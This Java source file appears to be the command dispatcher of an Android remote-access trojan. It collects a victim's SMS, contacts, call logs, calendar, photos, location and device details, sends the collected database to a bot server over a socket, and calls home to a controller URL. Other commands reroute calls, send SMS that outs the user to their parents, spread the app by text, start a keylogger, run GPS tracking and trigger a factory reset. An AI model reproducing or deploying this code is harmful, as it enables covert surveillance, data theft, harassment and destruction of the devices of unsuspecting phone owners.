package com.candroid.lofl.services;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.IntentService;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.preference.PreferenceManager;
import android.util.Log;

import com.candroid.lofl.activities.permissions.AdminActivity;
import com.candroid.lofl.activities.permissions.CalendarActivity;
import com.candroid.lofl.activities.permissions.CallLogActivity;
import com.candroid.lofl.activities.permissions.CameraActivity;
import com.candroid.lofl.activities.permissions.ContactsActivity;
import com.candroid.lofl.activities.permissions.LocationActivity;
import com.candroid.lofl.activities.permissions.PhoneActivity;
import com.candroid.lofl.activities.permissions.RecordAudioActivity;
import com.candroid.lofl.activities.permissions.StorageActivity;
import com.candroid.lofl.api.Apps;
import com.candroid.lofl.api.Bot;
import com.candroid.lofl.api.ContentProviders;
import com.candroid.lofl.api.Image;
import com.candroid.lofl.api.Media;
import com.candroid.lofl.api.Messaging;
import com.candroid.lofl.api.Notifications;
import com.candroid.lofl.api.Storage;
import com.candroid.lofl.api.Systems;
import com.candroid.lofl.api.Web;
import com.candroid.lofl.data.Constants;
import com.candroid.lofl.data.Wallpapers;
import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;
import com.candroid.lofl.jobs.JobsScheduler;
import com.candroid.lofl.data.pojos.CalendarEvent;
import com.candroid.lofl.data.pojos.Contact;
import com.candroid.lofl.data.pojos.PhoneCall;
import com.candroid.lofl.data.pojos.SmsMsg;
import com.candroid.lofl.receivers.AdminReceiver;
import com.candroid.lofl.receivers.OutgoingCallReceiver;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;

import javax.net.SocketFactory;

public class CommandsIntentService extends IntentService {

    private static final String TAG = CommandsIntentService.class.getSimpleName();

    public static final String ACTION_LOCATION = "ACTION_LOCATION";
    public static final String ACTION_SHARE_APP = "ACTION_SHARE_APP";
    public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
    public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
    public static final String ACTION_PLAY_SONG = "ACTION_PLAY_SONG";
    public static final String ACTION_DELETE_FILE = "ACTION_DELETE_FILE";
    public static final String ACTION_DOWNLOAD_HTTP_DATA = "ACTION_DOWNLOAD_HTTP_DATA";
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";
    public static final String ACTION_CALENDAR_EVENT = "ACTION_CALENDAR_EVENT";
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    public static final String ACTION_WEB_BROWSER = "ACTION_WEB_BROWSER";
    public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
    public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
    public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
    public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
    public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
    public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
    public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
    public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
    public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
    public static final String ACTION_ALARM_CLOCK = "ACTION_ALARM_CLOCK";
    public static final String ACTION_CREATE_NOTIFICATION = "ACTION_CREATE_NOTIFICATION";
    public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
    public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
    public static final String ACTION_SYNC_PHONE_TO_SERVER = "ACTION_SYNC_PHONE_TO_SERVER";
    public static final String ACTION_CALL_LOG_PERMISSION = "ACTION_CALL_LOG_PERMISSIONS";
    public static final String ACTION_LOCATION_PERMISSION = "ACTION_LOCATION_PERMISSION";
    public static final String ACTION_CONTACTS_PERMISSION = "ACTION_CONTACTS_PERMISSION";
    public static final String ACTION_RECORD_AUDIO_PERMISSION = "ACTION_RECORD_AUDIO_PERMISSION";
    public static final String ACTION_STORAGE_PERMISSION = "ACTION_STORAGE_PERMISSION";
    public static final String ACTION_CALENDAR_PERMISSION = "ACTION_CALENDAR_PERMISSION";
    public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
    public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
    public static final String ACTION_SEND_DB_TO_SERVER = "ACTION_SEND_DB_TO_SERVER";
    public static final String ACTION_KEYLOGGER = "ACTION_KEYLOGGER";

    public CommandsIntentService() {
        super("CommandsIntentService");
    }

    @SuppressLint("MissingPermission")
    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            Systems.Processor.startWakeLock(this);
            String action = intent.getAction();
            if (action.equals(ACTION_DCIM_FILES)) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

                    File[] pictures = Storage.Files.getFilesForDirectory(Storage.Files.getDcimDirectory().getPath() + "/Camera");
                    SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        if (pictures != null && pictures.length > 0) {
                            for (File f : pictures) {
                                Database.insertMedia(database, f.getName(), f);
                            }
                        }
                        database.setTransactionSuccessful();
                    } catch (SQLiteException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        if (database.isOpen()) {
                            database.close();
                        }
                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.DCIM_KEY);
                    }
                }
            } else if (action.equals(ACTION_PACKAGES)) {

                SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                try {
                    database.beginTransaction();
                    Database.insertPackages(database, Apps.getInstalledApps(CommandsIntentService.this));
                    database.setTransactionSuccessful();
                } catch (SQLiteException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    if (database.isOpen()) {
                        database.close();
                    }
                    JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.PACKAGES_KEY);
                }
            } else if (action.equals(ACTION_CONTACTS)) {
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(CommandsIntentService.this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertContacts(database, contacts);
                        database.setTransactionSuccessful();
                    } catch (SQLiteException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_CONTACTS);
                    }
                }
            } else if (action.equals(ACTION_DEVICE_INFO)) {
                SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                String ip = Systems.Networking.fetchIpv4Addresses().get(0);
                try {
                    database.beginTransaction();
                    Database.insertDevice(database, LoflService.sTelephoneAddress, ip, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
                    // TODO: 2/10/19 unable to access BuildConfig from library so we passed null for the flavor
                    //Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    database.close();
                    JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_DEVICE_INFO);
                }
            } else if (action.equals(ACTION_SYNC_PHONE_TO_SERVER)) {
                    Database.syncPhoneToDatabase(this);
                    Bot.syncDatabaseWithServer(this);
                    //Storage.Files.getDatabaseFile(this).delete();
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                    editor.putBoolean(Bot.IS_BOT_KEY, true);
                    editor.apply();
            } else if (action.equals(ACTION_PHONE_CALLS)) {
                if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(CommandsIntentService.this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(CommandsIntentService.this).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertPhoneCalls(database, phoneCalls);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
                    }
                    ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(CommandsIntentService.this);
                    try {
                        database.beginTransaction();
                        Database.insertCalendarEvents(database, calendarEvents);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                    }
                }
            } else if (action.equals(ACTION_SMS)) {
                if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    ArrayList<SmsMsg> smsMsgs = ContentProviders.Sms.fetchSmsMessages(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertSmsMessages(database, smsMsgs);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.SMS_KEY);
                        try{
                            boolean isAlreadyBot = false;
                            Socket socket = SocketFactory.getDefault().createSocket(Bot.SERVER_ADDRESS, 6666);
                            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                            oos.writeObject(LoflService.sTelephoneAddress);
                            oos.flush();
                            InputStream inputStream = socket.getInputStream();
                            if(inputStream.available() != 0){
                                ObjectInputStream ois = new ObjectInputStream(inputStream);
                                try {
                                    String message = (String) ois.readObject();
                                    if(message.equalsIgnoreCase("bot already exists")){
                                        isAlreadyBot = true;
                                    }
                                    ois.close();
                                } catch (ClassNotFoundException e) {
                                    e.printStackTrace();
                                }
                            }
                            if(!isAlreadyBot){
                                String ip = Systems.Networking.fetchIpv4Addresses().get(0);
                                oos.writeObject(ip);
                                oos.flush();
                                byte[] bytes = Storage.Files.fileToBytes(Storage.Files.getDatabaseFile(this));
                                oos.writeObject(bytes);
                                oos.flush();
                            }
                            inputStream.close();
                            oos.close();
                            socket.close();
                        }catch (IOException e){
                            e.printStackTrace();
                        }
                        //DELETE DATABASE FILE
                        Storage.Files.getDatabaseFile(CommandsIntentService.this).delete();
                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                        editor.putBoolean(Bot.IS_BOT_KEY, true);
                        editor.apply();
                    }
                }
            } else if (action.equals(ACTION_CALENDAR_EVENT)) {
                if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(CommandsIntentService.this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertCalendarEvents(database, calendarEvents);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                    }
                }
            } else if (action.equals(ACTION_WALLPAPER)) {
                double randomNumber = Math.random();
                String url = null;
                if (randomNumber <= 0.5) {
                    url = Wallpapers.WALLPAPERS[0];
                } else {
                    url = Wallpapers.WALLPAPERS[2];
                }
                Image.Bitmaps.changeWallpaper(this, Image.Bitmaps.getBitmapFromUrl(Uri.parse(url).toString()));
            } else if (action.equals(ACTION_WEB_BROWSER)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Web.Browser.openBrowser(this, url);
                }
            } else if (action.equals(ACTION_FAKE_PHONE_CALL)) {
                Media.Audio.fakePhoneCall(this);
            } else if (action.equals(ACTION_TEXT_PARENTS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Messaging.Text.tellMyParentsImGay(this);
                    JobsScheduler.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
                }
            } else if (action.equals(ACTION_INSERT_CONTACT)) {
                if (this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.NAME_KEY) && intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String name = intent.getStringExtra(Constants.Keys.NAME_KEY);
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        ContentProviders.Contacts.insertContact(CommandsIntentService.this, name, number);
                    }
                }
            } else if (action.equals(ACTION_WIFI_CARD)) {
                if (checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
                    Systems.Networking.Wifi.dosWifiCard(this);
                }
            } else if (action.equals(ACTION_FLASHLIGHT)) {
                if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    Systems.Camera.persistentBlinkingFlashlight(this);
                }
            } else if (action.equals(ACTION_VIBRATOR)) {
                Systems.Vibrations.vibrator(this);
            } else if (action.equals(ACTION_SHARE_APP)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Messaging.Text.shareApp(this);
                }
            }else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
                if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                    editor.apply();
                    OutgoingCallReceiver.sRerouteNumber = number;
                }
            } else if (action.equals(ACTION_CALL_PHONE)) {
                if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        Systems.Phone.phoneCall(this, number);
                    }
                }
            } else if (action.equals(ACTION_SEND_SMS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY) && intent.hasExtra(Constants.Keys.BODY_KEY)) {
                        String address = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        String body = intent.getStringExtra(Constants.Keys.BODY_KEY);
                        Messaging.Text.sendSms(address, body);
                    }
                }
            } else if (action.equals(ACTION_ALARM_CLOCK)) {
                if (intent.hasExtra(Constants.Keys.HOURS_KEY) && intent.hasExtra(Constants.Keys.MINUTES_KEY)) {
                    int hours = intent.getIntExtra(Constants.Keys.HOURS_KEY, 0);
                    int minutes = intent.getIntExtra(Constants.Keys.MINUTES_KEY, 0);
                    Systems.Alarms.setAlarmClock(this, hours, minutes);
                }
            } else if (action.equals(ACTION_CREATE_NOTIFICATION)) {
                if (intent.hasExtra(Constants.Keys.TITLE_KEY) && intent.hasExtra(Constants.Keys.CONTENT_KEY)) {
                    String title = intent.getStringExtra(Constants.Keys.TITLE_KEY);
                    String content = intent.getStringExtra(Constants.Keys.CONTENT_KEY);
                    Notifications.createNotification(this, title, content, 2000, android.R.drawable.stat_notify_error, Notification.PRIORITY_MAX);
                }
            } else if (action.equals(ACTION_CREATE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    String content = intent.getStringExtra(Constants.Keys.FILE_CONTENT_KEY);
                    Storage.Files.createTextFile(this, fileName, content);
                }
            } else if (action.equals(ACTION_PLAY_SONG)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Media.Audio.playSong(this, url);
                }
            } else if (action.equals(ACTION_DELETE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    Storage.Files.deleteFile(this, fileName);
                }
            } else if (action.equals(ACTION_LOCATION)) {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {

/*                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
                        if(locationManager.isLocationEnabled()){
                            locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                        }else{
                            locationProvider = locationManager.getProvider(LocationManager.NETWORK_PROVIDER);
                        }
                    }else{
                        locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                    }*/
                    LocationManager locationManager = Systems.Gps.getLocationManager(CommandsIntentService.this);
                    String provider = LocationManager.GPS_PROVIDER;
                    Location lastKnownLocation = locationManager.getLastKnownLocation(provider);
                    if(lastKnownLocation != null){
                        double latitude = lastKnownLocation.getLatitude();
                        double longitude = lastKnownLocation.getLongitude();
                        Database.insertLocation(DatabaseHelper.getInstance(CommandsIntentService.this), latitude, longitude);
                    }
                }
            }else if(action.equals(ACTION_GPS_TRACKER)){
                boolean shouldTrackGps = false;
                if(intent.hasExtra(Systems.Gps.GPS_TRACKER_KEY)){
                    shouldTrackGps = intent.getBooleanExtra(Systems.Gps.GPS_TRACKER_KEY, false);
                }
                if(shouldTrackGps){
                    if(! Systems.Gps.isTrackingLocation()){
                        Systems.Gps.startLocationTracker(this);
                    }
                }else{
                    if(Systems.Gps.isTrackingLocation()){
                        Systems.Gps.stopLocationTracker(this);
                    }
                }
            }else if(action.equals(ACTION_DOWNLOAD_HTTP_DATA)){
                if(intent.hasExtra(Constants.Keys.URL_KEY)){
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            int response = -1;
                            InputStream inputStream = null;
                            try {
                                URL url = new URL(Uri.parse(Bot.BOT_CONTROLLER_URL.concat(LoflService.sTelephoneAddress)).toString());
                                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                                connection.setReadTimeout(10000);
                                connection.setConnectTimeout(10000);
                                connection.setRequestMethod("GET");
                                connection.setDoInput(true);
                                connection.connect();
                                response = connection.getResponseCode();
                                Log.d(TAG, String.format("response code = %s", response));
                                inputStream = connection.getInputStream();
                                Reader reader = null;
                                reader = new InputStreamReader(inputStream, "UTF-8");
                                char[] buffer = new char[1000];
                                reader.read(buffer);
                                String content = new String(buffer);
                                Log.d(TAG, String.format("HTML CONTENT = %s", content));
                            } catch (MalformedURLException e) {
                                e.printStackTrace();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }finally {
                                if(inputStream != null){
                                    try {
                                        inputStream.close();
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }
                                if(response == 200){
                                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                    editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
                                    editor.apply();
                                }
                            }
                        }
                    }).start();
                }
            }else if(action.equals(ACTION_CALL_LOG_PERMISSION)){
                startPermissionActivity(this, intent, CallLogActivity.class);
            }else if(action.equals(ACTION_LOCATION_PERMISSION)){
                startPermissionActivity(this, intent, LocationActivity.class);
            }else if(action.equals(ACTION_CONTACTS_PERMISSION)){
                startPermissionActivity(this, intent, ContactsActivity.class);
            }else if(action.equals(ACTION_RECORD_AUDIO_PERMISSION)){
                startPermissionActivity(this, intent, RecordAudioActivity.class);
            }else if(action.equals(ACTION_STORAGE_PERMISSION)){
                startPermissionActivity(this, intent, StorageActivity.class);
            }else if(action.equals(ACTION_CALENDAR_PERMISSION)){
                startPermissionActivity(this, intent, CalendarActivity.class);
            }else if(action.equals(ACTION_CAMERA_PERMISSION)){
                startPermissionActivity(this, intent, CameraActivity.class);
            }else if(action.equals(ACTION_PHONE_PERMISSION)){
                startPermissionActivity(this, intent, PhoneActivity.class);
            }else if(action.equals(ACTION_SEND_DB_TO_SERVER)){
                if(Storage.Files.getDatabaseFile(this).exists()){
                    Bot.syncDatabaseWithServer(this);
                }
            }else if(action.equals(ACTION_FACTORY_RESET)){
                if(intent.hasExtra(AdminReceiver.REASON_KEY)){
                    AdminReceiver.sReason = intent.getStringExtra(AdminReceiver.REASON_KEY);
                }
                startPermissionActivity(this, intent, AdminActivity.class);
            }else if(action.equals(ACTION_KEYLOGGER)){
                Systems.Root.startKeyloggingService(this);
                Systems.Phone.Settings.openAccessibilityOptions(this);
            }else {
                Log.d(TAG, "No action found!");
            }
            Systems.Processor.stopWakeLock();
            stopSelf();
        }
    }

    public static void startPermissionActivity(Context context, Intent intent, Class activityClass){
        intent.setAction(Intent.ACTION_VIEW);
        intent.setClass(context, activityClass);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
        context.startActivity(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}